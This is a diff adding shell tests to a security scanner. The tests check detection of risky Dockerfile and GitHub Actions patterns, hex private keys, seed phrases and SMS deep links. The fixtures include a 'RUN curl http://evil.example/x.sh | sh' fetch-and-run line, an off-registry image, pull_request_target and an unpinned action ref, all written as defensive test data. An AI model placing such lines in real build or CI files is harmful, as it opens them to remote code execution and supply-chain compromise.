@@ -810,6 +810,44 @@ rm -rf "$SC_DIR"
     && check "kv FP guard: request line clean" "0" "1" \
     || check "kv FP guard: request line clean" "0" "0"
 
+# Dockerfile + CI workflow supply-chain (FROM off-registry, curl|sh,
+# uses: mutable ref, pull_request_target) + hex-key/mnemonic secrets
+DC_DIR=$(mktemp -d)
+printf 'FROM evil.example/img:latest\nRUN curl http://evil.example/x.sh | sh\nADD http://evil.example/p.bin /x\n' > "$DC_DIR/Dockerfile"
+./hlse_core package --manifest "$DC_DIR/Dockerfile" 2>&1 | grep -q "HLSE-PKG-DFROM\|off the known registries" \
+    && check "docker: off-registry FROM flagged" "0" "0" \
+    || check "docker: off-registry FROM flagged" "0" "1"
+./hlse_core package --manifest "$DC_DIR/Dockerfile" 2>&1 | grep -q "pipes it to an interpreter" \
+    && check "docker: RUN curl|sh flagged" "0" "0" \
+    || check "docker: RUN curl|sh flagged" "0" "1"
+printf 'FROM ghcr.io/org/img:1.0\nRUN apk add curl\n' > "$DC_DIR/Dockerfile"
+./hlse_core package --manifest "$DC_DIR/Dockerfile" 2>&1 | grep -q "0 typosquat" \
+    && check "docker FP guard: ghcr.io + apk clean" "0" "0" \
+    || check "docker FP guard: ghcr.io + apk clean" "0" "1"
+mkdir -p "$DC_DIR/.github/workflows"
+printf 'on: pull_request_target\njobs:\n  x:\n    steps:\n      - uses: octo/action@main\n' > "$DC_DIR/.github/workflows/ci.yml"
+./hlse_core package --manifest "$DC_DIR/.github/workflows/ci.yml" 2>&1 | grep -q "pull_request_target" \
+    && check "gha: pull_request_target flagged" "0" "0" \
+    || check "gha: pull_request_target flagged" "0" "1"
+./hlse_core package --manifest "$DC_DIR/.github/workflows/ci.yml" 2>&1 | grep -q "mutable ref" \
+    && check "gha: uses@main mutable ref flagged" "0" "0" \
+    || check "gha: uses@main mutable ref flagged" "0" "1"
+printf 'on: pull_request\njobs:\n  x:\n    steps:\n      - uses: actions/checkout@0123456789abcdef0123456789abcdef01234567\n' > "$DC_DIR/.github/workflows/ok.yml"
+./hlse_core package --manifest "$DC_DIR/.github/workflows/ok.yml" 2>&1 | grep -q "0 typosquat" \
+    && check "gha FP guard: SHA-pinned uses clean" "0" "0" \
+    || check "gha FP guard: SHA-pinned uses clean" "0" "1"
+rm -rf "$DC_DIR"
+
+./hlse_core secret 'key: 0x4f3edf983ac636a65a842ce7c78d9aa706d3b113bce9c46f30d7d21715b23b1d' 2>&1 | grep -q "HEX_PRIVATE_KEY" \
+    && check "secret: 0x 64-hex key flagged" "0" "0" \
+    || check "secret: 0x 64-hex key flagged" "0" "1"
+./hlse_core secret 'seed: apple banana cherry dog elephant frog grape hotel ivory jacket kite lemon' 2>&1 | grep -q "MNEMONIC" \
+    && check "secret: BIP39 seed phrase flagged" "0" "0" \
+    || check "secret: BIP39 seed phrase flagged" "0" "1"
+./hlse_core secret 'the quick brown fox jumps over the lazy dog and runs through the forest near the river' 2>&1 | grep -q "no credentials" \
+    && check "secret FP guard: prose sentence clean" "0" "0" \
+    || check "secret FP guard: prose sentence clean" "0" "1"
+
 # Mobile deep-link schemes (sms:/tel:/intent:) — smishing vector
 ./hlse_core 'sms:+19005551234?body=Your%20code%20is%20991' 2>&1 | grep -q "smishing" \
     && check "deeplink: sms: scheme flagged" "0" "0" \
